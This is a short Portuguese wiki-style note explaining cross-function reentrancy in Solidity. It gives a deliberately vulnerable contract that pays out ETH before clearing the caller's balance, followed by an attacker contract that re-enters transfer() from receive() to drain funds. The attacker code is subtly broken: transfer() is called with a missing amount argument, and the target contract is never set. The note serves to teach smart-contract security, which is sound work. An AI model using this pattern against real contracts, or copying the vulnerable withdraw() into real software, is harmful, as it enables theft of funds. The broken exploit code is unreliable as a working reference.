+++
title = "Reentrada Entre Funções (Solidity)"
author = ["Gabriel Rosa"]
date = 2023-09-11
tags = ["reentrancy"]
draft = false
+++

tags
: [Reentrada (SWC-107)]({{< relref "reentrada_swc_107.md" >}})

source
: [Cross-Function Reentrancy (SCSFG)](https://scsfg.io/hackers/reentrancy/#cross-function-reentrancy)

É o tipo de reentrada que afeta o contexto de mais de uma função por elas compartilharem do mesmo estado.


## Vulnerabilidade {#vulnerabilidade}

No código abaixo, a função de saque irá pegar o saldo disponível do chamador da função e transferir para ele esse valor caso o contrato tenha ETH suficiente para isso. Se a transferência foi bem-sucedida, ele irá atualizar o saldo disponível do chamador da função.

O problema é: se o chamador da função for um contrato, ele poderá usar `receive()` para executar a função `transfer(address,uint256)` antes que a função `withdraw()` atualize o saldo disponível do chamador da função.

```solidity
contract Vulnerable {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) public {
        if (balances[msg.sender] >= amount) {
            balances[to] += amount;
            balances[msg.sender] -= amount;
        }
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }
}
```


## Exploitando {#exploitando}

```solidity
contract Attacker {
    Vulnerable public vulnerableContract;
    address public receiverAddress;

    constructor(address _receiverAddress) {
        receiverAddress = _receiverAddress;
    }

    function attack() public {
        vulnerableContract.withdraw();
    }

    receive() external payable {
        vulnerableContract.transfer(receiverAddress);
    }
}
```
